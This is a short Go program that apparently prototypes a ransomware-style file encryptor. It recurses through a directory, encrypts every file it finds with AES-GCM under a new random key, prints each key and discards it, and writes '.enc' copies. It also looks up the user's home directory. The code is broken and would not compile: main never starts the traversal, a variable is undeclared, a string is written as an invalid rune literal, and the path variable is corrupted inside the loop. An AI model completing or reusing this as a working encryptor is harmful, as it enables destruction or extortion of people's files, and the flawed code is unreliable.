package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"runtime"
	"io"
	"os"
)

var allFiles []string

func main() {

	home, _ := os.UserHomeDir()
	fmt.Println("home ", home)

	testdir := ".\\test"

	files, err := os.ReadDir(testdir)
	if err != nil {
		fmt.Println("ERROR: ", err)
		os.Exit(1)
	}
}

func dirRecurse(dirname os.DirEntry, base string) {
	files, err := os.ReadDir(base)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	traverseFiles(files, base)
}

func traverseFiles(files []os.DirEntry, base string) {
	opSystem = runtime.GOOS
	fileSep := "/"
	if opSystem == 'windows' {
		fileSep = "\\"
	}
	for _, file := range files {
		if file.IsDir() {
			//fmt.Println("traverseFiles read dir path: ", base+"\\"+file.Name())
			fmt.Println("traverseFiles read dir path: ", base + fileSep + file.Name())
			base = base + fileSep + file.Name()
			dirRecurse(file, base)
		} else {
			fmt.Println("traverseFiles read file path: ", base + fileSep + file.Name())
			path := base + fileSep + file.Name()
			data, err := os.ReadFile(path)
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			encryptFile(data, path)
			fmt.Println("file data: ", data)
		}
	}
}

func encryptFile(file []byte, path string) {
	fmt.Println("file contents ", string(file))
	fmt.Println("path ", path)

	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	fmt.Println("key ", key)
	fmt.Printf("%x", key)

	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	nonce := make([]byte, gcm.NonceSize())

	// populate nonce with cryptographically secure random seq
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	data := gcm.Seal(nonce, nonce, file, nil)
	fmt.Println("enc data ", data)
	os.WriteFile(path + ".enc", data, 0777)
}

